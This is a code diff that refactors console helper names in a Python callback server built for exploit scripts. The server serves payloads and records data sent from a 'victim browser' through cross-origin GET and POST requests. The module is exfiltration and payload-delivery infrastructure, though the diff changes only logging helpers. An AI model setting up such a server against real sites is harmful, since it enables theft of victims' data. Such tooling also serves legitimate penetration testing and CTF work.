@@ -26,13 +26,20 @@ Usage (copy start_server, SERVED_FILES, EXFIL_DATA into your exploit script):
     httpd.shutdown()
     httpd.server_close()
 """
+import sys
 
 import datetime
 import json
-import sys
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs, urlparse
+
+# ==============================================================================
+# CONSOLE HELPERS (inline so this module is self-contained)
+# ==============================================================================
+
+def print_ok(msg: str)   -> None: print(f"  [+] {msg}")
+def print_info(msg: str) -> None: print(f"  [*] {msg}")
 
 # ==============================================================================
 # SHARED STATE (copy this, the REQUEST HANDLER, and START SERVER into your main script)
@@ -43,13 +50,6 @@ SERVED_FILES: dict = {}
 
 # {url_path: {param_name: param_value}} — data received from victim browser
 EXFIL_DATA: dict = {}
-
-# ==============================================================================
-# CONSOLE HELPERS (inline so this module is self-contained)
-# ==============================================================================
-
-def _ok(msg):   print(f"  [+] {msg}")
-def _info(msg): print(f"  [*] {msg}")
 
 # ==============================================================================
 # REQUEST HANDLER
@@ -74,9 +74,9 @@ class CallbackHandler(BaseHTTPRequestHandler):
                 for k, v in parse_qs(query_string).items()
             }
             EXFIL_DATA[path] = params
-            _ok(f"GET  {self.path}  ←  {client_ip}  [{timestamp}]")
+            print_ok(f"GET  {self.path}  ←  {client_ip}  [{timestamp}]")
             for k, v in params.items():
-                _ok(f"     {k} = {v}")
+                print_ok(f"     {k} = {v}")
 
         # ── 2. Serve registered payloads ──────────────────────────────────────
         entry = SERVED_FILES.get(path)
@@ -93,7 +93,7 @@ class CallbackHandler(BaseHTTPRequestHandler):
         self.send_header("Access-Control-Allow-Origin", "*")
         self.end_headers()
         self.wfile.write(body)
-        _info(f"GET  {path} → served ({len(body)} bytes) to {client_ip} [{timestamp}]")
+        print_info(f"GET  {path} → served ({len(body)} bytes) to {client_ip} [{timestamp}]")
 
     def do_POST(self):
         content_length = int(self.headers.get("Content-Length", 0))
@@ -120,9 +120,9 @@ class CallbackHandler(BaseHTTPRequestHandler):
         self.send_header("Access-Control-Allow-Origin", "*")
         self.end_headers()
 
-        _ok(f"POST {path}  ←  {client_ip}  [{timestamp}]")
+        print_ok(f"POST {path}  ←  {client_ip}  [{timestamp}]")
         for k, v in parsed_body.items():
-            _ok(f"     {k} = {v}")
+            print_ok(f"     {k} = {v}")
 
     def do_OPTIONS(self):
         """CORS preflight — required when victim JS uses fetch() with non-simple headers."""
@@ -147,7 +147,7 @@ def start_server(host: str = "0.0.0.0", port: int = 80) -> HTTPServer:
     """
     httpd = HTTPServer((host, port), CallbackHandler)
     threading.Thread(target=httpd.serve_forever, daemon=True).start()
-    _info(f"Callback server listening → http://{host}:{port}")
+    print_info(f"Callback server listening → http://{host}:{port}")
     return httpd
 
 
